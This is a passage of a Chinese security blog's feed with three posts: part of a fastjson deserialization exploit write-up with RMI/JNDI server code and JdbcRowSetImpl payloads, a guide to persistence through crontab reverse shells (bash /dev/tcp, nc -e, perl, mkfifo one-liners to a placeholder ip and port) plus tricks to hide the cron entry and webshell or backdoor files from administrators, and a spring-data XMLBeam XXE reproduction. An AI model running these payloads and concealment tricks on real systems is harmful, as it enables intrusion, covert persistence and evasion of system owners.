System.out.println(&quot;\n [*] enjoy���&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="创建RMI-Server"><a href="#创建RMI-Server" class="headerlink" title="创建RMI Server"></a>创建RMI Server</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.luckyqiao.rmi;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        RemoteHello remoteHello = new RemoteHelloImpl();</span><br><span class="line">        try &#123;</span><br><span class="line">            RemoteHello stub = (RemoteHello) UnicastRemoteObject.exportObject(remoteHello, 4000); //导出服务，使用4000端口</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8000); //获取Registry</span><br><span class="line">            registry.bind(&quot;hello&quot;, stub); //使用名字hello，将服务注册到Registry</span><br><span class="line">        &#125; catch (AlreadyBoundException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参照sky 的rmi server 进行修改如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author sky</span><br><span class="line"> */</span><br><span class="line">public class rmiserver &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference(&quot;CommandObject&quot;,</span><br><span class="line">                &quot;CommandObject&quot;,&quot;http://localhost:80/&quot;);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;Exploit&quot;,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637303551208.jpg" alt="-w1227"></p>
<p>整理下 利用方式<br>【1】首先准备一个 RMI Server<br>【2】开启对应的httpserver<br>【3】CommandObject.class 执行文件<br>【4】利用poc</p>
<h3 id="1-2-47-与1-2-24的区别"><a href="#1-2-47-与1-2-24的区别" class="headerlink" title="1.2.47 与1.2.24的区别"></a>1.2.47 与1.2.24的区别</h3><p>在该漏洞情况下 poc与1.2.47 稍有区别<br>1.2.24 poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据poc来看 是进行了黑名单的绕过，在1.2.24的漏洞情况下，将”com.sun.rowset.JdbcRowSetImpl”进行了黑名单的处理，但在1.2.47中又给绕过了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;x&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;:&quot;rmi://ip:port/Exploit&quot;,</span><br><span class="line">		&quot;autoCommit&quot;: true</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="绕过分析-待续"><a href="#绕过分析-待续" class="headerlink" title="绕过分析-待续"></a>绕过分析-待续</h3><h2 id="fastjson黑名单"><a href="#fastjson黑名单" class="headerlink" title="fastjson黑名单"></a>fastjson黑名单</h2><p>在1.2.48的补丁中将 “java.lang.Class”给进行拉黑处理了<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637315127442.jpg" alt="-w748"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a><br><a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a><br><a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a><br><a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">fastjson =&lt; 1.2.47 反序列化漏洞浅析</a></p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 漏洞学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计划任务]]></title>
      <url>/2019/07/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>计划任务<br>[TOC]</p>
<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>linux 计划任务 结合 NC执行后门</p>
<h2 id="查看crontab执行情况"><a href="#查看crontab执行情况" class="headerlink" title="查看crontab执行情况"></a>查看crontab执行情况</h2><p>查看其日志的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/cron</span><br></pre></td></tr></table></figure></p>
<h2 id="crontab-命令"><a href="#crontab-命令" class="headerlink" title="crontab 命令"></a>crontab 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line"> crontab [options] file</span><br><span class="line"> crontab [options]</span><br><span class="line"> crontab -n [hostname]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -u &lt;user&gt;  define user</span><br><span class="line"> -e         edit user&apos;s crontab</span><br><span class="line"> -l         list user&apos;s crontab</span><br><span class="line"> -r         delete user&apos;s crontab</span><br><span class="line"> -i         prompt before deleting</span><br><span class="line"> -n &lt;host&gt;  set host in cluster to run users&apos; crontabs</span><br><span class="line"> -c         get host in cluster to run users&apos; crontabs</span><br><span class="line"> -s         selinux context</span><br><span class="line"> -x &lt;mask&gt;  enable debugging</span><br><span class="line"></span><br><span class="line">Default operation is replace, per 1003.2</span><br></pre></td></tr></table></figure>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_2_centos ~]# cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure>
<p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293"></p>
<h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<h4 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数	描述</span><br><span class="line">-c string	从string中读取命令并处理他们</span><br><span class="line">-r 	启动限制性shell,限制用户在默认目录下活动</span><br><span class="line">-i	启动交互性shell,允许用户输入</span><br><span class="line">-s	从标准输入读取命令</span><br></pre></td></tr></table></figure>
<p>即启用交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux shell下常用的文件描述符是：</span><br><span class="line">1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </span><br><span class="line">2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </span><br><span class="line">3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438"></p>
<p>在man bash 里面解释为<br><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712"></p>
<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
<h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>以及段师傅的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &apos;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&apos;</span><br></pre></td></tr></table></figure>
<p>别忘了重启</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron restart</span><br></pre></td></tr></table></figure>
<p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888"><br><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887"></p>
<p>修改下软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf bash /bin/sh</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533"></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530"><br><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300"></p>
<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度</span><br></pre></td></tr></table></figure>
<h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * nc -e /bin/sh ip port</span><br></pre></td></tr></table></figure>
<p>别忘了重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond restart</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * perl -e &apos;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
<h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
<p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657"></p>
<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563"></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112"></p>
<h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136"></p>
<h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
<p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch .webshell.php 创建名字为 .webshell.php 的文件</span><br><span class="line">mkdir .backdoor/ 创建名字为 .backdoor 的文件夹</span><br></pre></td></tr></table></figure>
<p>终极方法<br>在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。<br>是文件的话浏览器访问直接输 … 就行，目录同理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch … 创建名字为 … 的文件</span><br><span class="line">mkdir … 创建名字为 … 的文件夹</span><br></pre></td></tr></table></figure>
<h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>  <a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" target="_blank" rel="noopener">解决ubuntu-crontab反弹shell失败的问题</a></p>
<p>   <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/" target="_blank" rel="noopener">Netcat without -e? No Problem!</a></p>
]]></content>
      
        <categories>
            
            <category> 内网渗透 </category>
            
            <category> 计划任务 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 计划任务 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE实例及利用3]]></title>
      <url>/2019/07/08/Web%E6%B8%97%E9%80%8F/XXE/XXE%E5%AE%9E%E4%BE%8B%E5%8F%8A%E5%BA%94%E7%94%A83/</url>
      <content type="html"><![CDATA[<p>Java - XXE</p>
<h1 id="Java-XXE"><a href="#Java-XXE" class="headerlink" title="Java - XXE"></a>Java - XXE</h1><p>XXE在Java 代码中的漏洞示例</p>
<h2 id="JAVA常见XXE漏洞写法案例"><a href="#JAVA常见XXE漏洞写法案例" class="headerlink" title="JAVA常见XXE漏洞写法案例"></a>JAVA常见XXE漏洞写法案例</h2><h3 id="spring-data-XMLBean-XXE复现分析"><a href="#spring-data-XMLBean-XXE复现分析" class="headerlink" title="spring-data-XMLBean XXE复现分析"></a>spring-data-XMLBean XXE复现分析</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p>【1】下载环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/spring-projects/spring-data-examples.git</span><br></pre></td></tr></table></figure></p>
<p>【2】下载安装maven并配置好环境变量<br>因为这里的新版本已经对次做了修复，所以这里的版本改为 2.0.5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.springframework.data&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;spring-data-commons&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>【3】配置好环境变量后，进入对应的web/projection 打包运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613639506348.jpg" alt="-w1133"></p>
<h4 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h4><p>进入对应目录搭建运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613640157733.jpg" alt="-w754"></p>
<h4 id="poc复现"><a href="#poc复现" class="headerlink" title="poc复现"></a>poc复现</h4><p>构造post请求<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613640647871.jpg" alt="-w1318"><br>比较奇怪的一点是，正常的xxe请求 任意文件读取 都应该是 file:///<br>这里直接执行也行<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613641950150.jpg" alt="-w1094"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意  这里的content-type 类型，得支持，改为 application/xml</span><br></pre></td></tr></table></figure>
<p>xxe支持的content-type fuzz一下<br>在位置中application/xhtml+xml 与 application/xml 的效果是一样的<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613841433359.jpg" alt="-w1016"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注</span><br><span class="line">Accept代表发送端（客户端）希望接受的数据类型。 </span><br><span class="line">比如：Accept：text/xml; </span><br><span class="line">代表客户端希望接受的数据类型是xml类型</span><br><span class="line"></span><br><span class="line">Content-Type代表发送端（客户端|服务器）发送的实体数据的数据类型。 </span><br><span class="line">比如：Content-Type：text/html; </span><br><span class="line">代表发送端发送的数据格式是html。</span><br></pre></td></tr></table></figure>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从该位置可以知道漏洞位置是在 firstname和lastname的接收处理，所以跟踪下idea下的该函数。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613896457891.jpg" alt="-w1283"><br>该maven项目demo中就application和userController 两个函数，从主函数跟踪。<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613906870820.jpg" alt="-w911"><br>可以看到post请求中的user.getFirstname(),user.getLastname() 方法<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613907763911.jpg" alt="-w404"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613909426094.jpg" alt="-w805"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15613909700427.jpg" alt="-w881"></p>
<p>跟踪下 会发现，在调用responseEntity的时候就已经读取文件了<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15614750470756.jpg" alt="-w932"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15614751204095.jpg" alt="-w943"></p>
<p>参考网上的分析，漏洞的处理函数位是在org.xmlbeam.ProjectionInvocationHandler:invokeReadProjection()处理<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15614773758537.jpg" alt="-w913"></p>
<p>顺带在这里看下相对路径处理成功的原因</p>
<h2 id="待补充细分"><a href="#待补充细分" class="headerlink" title="待补充细分"></a>待补充细分</h2><p>  在提交http/post请求后，跟踪下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> &lt;T&gt; Object readWithMessageConverters</span><br></pre></td></tr></table></figure>
<p>在对该post参数进行处理时，这里还没进行文件读取转换<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15618975324384.jpg" alt="-w900"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15618981734937.jpg" alt="-w1184"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15618983029402.jpg" alt="-w1144"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15618991907073.jpg" alt="-w1425"><br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15618992335070.jpg" alt="-w704"></p>
<p>漏洞原因是在于XMLBeam漏洞版本中没有限制外部实体<br><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15619003084333.jpg" alt="-w701"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15619002278361.jpg" alt="-w771"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15619001968741.jpg" alt="-w810"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15619001679940.jpg" alt="-w805"></p>
<p><img src="/2019/07/08/Web渗透/XXE/XXE实例及应用3/XXE实例及利用3/15619001256468.jpg" alt="-w915"></p>
